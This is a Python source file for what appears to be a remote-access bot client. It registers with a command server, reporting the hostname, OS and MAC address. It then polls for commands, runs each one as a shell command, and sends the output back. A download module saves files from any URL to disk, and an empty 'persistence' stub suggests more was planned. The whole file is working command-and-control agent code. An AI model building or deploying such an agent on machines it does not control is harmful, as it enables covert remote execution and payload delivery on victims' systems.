import http.client
import json
import os
import platform
import subprocess
import threading
import time
import traceback


from urllib.parse import urlparse
from uuid import getnode as get_mac

SERVER_URI = "http://127.0.0.1:8000"
SERVER_TIMEOUT = 10

COMMAND_INTERVAL = 30
SUBPROCESS_TIMEOUT = 10
CONNECTION_ERROR_INTERVAL = 10

DEFAULT_HEADERS = {
    'Content-Type': 'application/json'
}

SHELL_COMMAND = 1
MODULE_COMMAND = 1


def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.start()
        return

    return wrapper


class Client:
    modules = [
        'DownloaderModule',
    ]
    mac = None
    name = None
    _reg_path = None
    registered = False
    uuid = None
    con = None

    def connect(self):
        uri = urlparse(SERVER_URI)

        host = uri.hostname
        if uri.port:
            port = uri.port
        elif uri.scheme == 'https':
            port = 443
        else:
            port = 80

        while not self.registered:
            if uri.scheme == 'https':
                self.con = http.client.HTTPSConnection(host, port, timeout=SERVER_TIMEOUT)
            else:
                self.con = http.client.HTTPConnection(host, port, timeout=SERVER_TIMEOUT)

            try:
                if self.register_client():
                    break
            except:
                time.sleep(CONNECTION_ERROR_INTERVAL)

    def __init__(self):
        self.name = os.uname().nodename
        self.os = "%s %s" % (platform.platform(), platform.architecture())
        self.mac = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
        self.connect()

    def run(self):
        while True:
            for cmd in self.receive_commands():
                self.run_command(cmd)
                time.sleep(COMMAND_INTERVAL)
            time.sleep(COMMAND_INTERVAL)

    def run_command(self, cmd, **kwargs):
        # internal commands
        if cmd.get('command_type') == MODULE_COMMAND:
            print('[D] got internal command: %s' % cmd)
            try:
                data = json.loads(cmd.get('command'))
            except Exception as e:
                tb = traceback.format_exc()
                self.send_result(cmd.get('uuid'), tb, has_error=True)
                return

            if data.get('command_name') == 'http_download':
                print('[D] Download ')
                self.http_download(cmd.get('uuid'), data.get('file_url'), data.get('save_path'))
            return

        _command = cmd.get('command', None)
        try:
            print('[D] Running command "%s"' % _command)
            out = subprocess.check_output(_command, timeout=SUBPROCESS_TIMEOUT, shell=True, **kwargs)
            result = out.decode('utf-8')
            self.send_result(cmd.get('uuid'), result)
        except Exception as e:
            print(e)
            self.send_result(cmd.get('uuid'), e, has_error=True)

    def send_result(self, cmd_uuid, result, has_error=False):
        con = self.con
        data = json.dumps({
            'command': cmd_uuid,
            'result': str(result),
            'has_error': has_error
        })
        con.request('POST', '/command/results/', data, headers=DEFAULT_HEADERS)
        r = con.getresponse()
        if r.status == 201:
            print("[D] Results saved in backend")
        con.close()

    def receive_commands(self):
        while True:
            try:
                con = self.con
                con.request('GET', '/commands/?id=%s' % self.uuid, headers=DEFAULT_HEADERS)
            except ConnectionRefusedError or http.client.CannotSendRequest:
                time.sleep(CONNECTION_ERROR_INTERVAL)
                self.connect()
                continue

            r = con.getresponse()
            content = r.read()
            con.close()
            if r.status == 200:
                try:
                    r = json.loads(content)
                    return r
                except:
                    return None
            time.sleep(COMMAND_INTERVAL)

    def register_client(self):
        print('[D] Trying to register')
        headers = DEFAULT_HEADERS

        json_data = json.dumps({
            'computer_name': self.name,
            'os': self.os,
            'mac': self.mac,
        })
        con = self.con
        con.request('POST', "/new/", json_data, headers)
        r = con.getresponse()
        data = r.read()
        con.close()

        if r.status == 201:
            try:
                data = json.loads(data)
            except Exception as e:
                return False

            self.uuid = data.get('uuid')
            print("DEBUG: my uuuid: %s" % self.uuid)
            return True
        return False

    # modules

    def persistence(self):
        pass

    @threaded
    def http_download(self, command_uuid, file_url, save_path=None, ):
        """
        {
            'command_name': 'http_download',
            'file_url': str,
            'save_path: str (opt)
        }

        :param command_uuid:
        :param file_url:
        :param save_path:
        :return:
        """
        uri = urlparse(file_url)

        host = uri.hostname
        if uri.port:
            port = uri.port
        elif uri.scheme == 'https':
            port = 443
        else:
            port = 80

        filename = str(uri.path).split('/')[-1]

        if save_path:
            dest_path = os.path.join(save_path, filename)
        else:
            dest_path = filename
        print(dest_path)

        try:
            if uri.scheme == 'https':
                con = http.client.HTTPSConnection(host, port)
            else:
                con = http.client.HTTPConnection(host, port)

            con.request('GET', uri.path, headers=DEFAULT_HEADERS)
            r = con.getresponse().read()

            with open(dest_path, 'wb') as f:
                f.write(r)

            _full_path = os.path.join(os.getcwd(), dest_path)
            self.send_result(command_uuid, "File downloaded to '%s'" % _full_path)

        except:
            tb = traceback.format_exc()
            self.send_result(command_uuid, tb, has_error=True)


if __name__ == '__main__':
    try:
        c = Client()
        c.run()

    except Exception as e:
        raise e

    # pprint(vars(c))
